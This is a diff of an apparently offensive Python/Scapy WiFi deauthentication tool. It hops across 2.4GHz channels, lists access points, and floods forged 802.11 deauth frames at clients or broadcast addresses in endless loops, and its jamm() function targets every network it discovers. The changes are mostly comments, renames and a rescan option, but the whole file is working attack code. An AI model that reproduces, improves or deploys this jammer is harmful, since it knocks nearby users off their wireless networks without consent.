@@ -52,8 +52,8 @@ class Deauth:
             print "AP: %r [%s], channed %d, %s" % (ssid, bssid, channel,' / '.join(crypto))
         self.networks[bssid] = (ssid, channel, crypto)
 
-    def __channel_hopper(self):
-        while True:
+    def __channel_hopper(self): # hop channels to cover the whole 2.4GHz spectrum
+        while True:             # (channels 1-13, sry Japan no 14 for you)
             channel = randint(1,13)
             os.system("iwconfig %s channel %d" % (self.iface, channel))
             time.sleep(1)
@@ -72,13 +72,13 @@ class Deauth:
         channel_hop.terminate()
         channel_hop.join()
 
-    def show_networks(self):
+    def show_networks(self):   # a wrapper for the __insert_ap functon, spawns processes
         self.networks.clear()
         channel_hop = Process(target = self.__channel_hopper)
         channel_hop.start()
-        sniff(iface=self.iface, prn=self.__insert_ap, store=False, lfilter=lambda p: (Dot11Beacon in p or Dot11ProbeResp in p), timeout = 15)
+        sniff(iface=self.iface, prn=self.__insert_ap, store=False, lfilter=lambda p: (Dot11Beacon in p or Dot11ProbeResp in p), timeout = 20)
         channel_hop.terminate()
-        channel_hop.join()
+        channel_hop.join() # free the memory
 
     def __deauth(self, bssid, client = "FF:FF:FF:FF:FF:FF", count = -1):
         pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()
@@ -86,7 +86,6 @@ class Deauth:
         if client != 'FF:FF:FF:FF:FF:FF':
             client_2_ap_pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth()
         print '[*] Sending Deauth to ' + client + ' from ' + bssid
-        print '> '
         while count != 0:
             for i in range(64):
                 sendp(pkt, iface = self.iface)
@@ -99,7 +98,11 @@ class Deauth:
         proc.start()
         self.processes[str(proc.pid)] = str(bssid) + " " + str(client)
 
-    def jamm(self, count = -1, client = 'FF:FF:FF:FF:FF:FF'):
+    def jamm(self, count = -1, client = 'FF:FF:FF:FF:FF:FF', new = False):
+        if new:
+            self.silent = True # don't display output
+            self.show_networks()
+            self.silent = False
         if len(self.networks) == 0:
             self.silent = True
             self.show_networks()
@@ -114,7 +117,7 @@ class Deauth:
             proc.start()
             self.processes[str(proc.pid)] = str(self.networks.items()[x][0]) + " " + str(client)
 
-    def stop_deauth(self, all = False):
+    def stop(self, all = False):
         if len(self.processes) == 0:
             print "Nothing is running :/"
             return 0
@@ -145,7 +148,7 @@ class Deauth:
 
 
 
-if __name__ == "__main__":                      # you can run me with python modules/deauth.py
+if __name__ == "__main__":                      # you can run me with: python modules/deauth.py
     iface = raw_input("Enter a wireless iface: ")
     deauth = Deauth(iface)
     deauth.jamm()
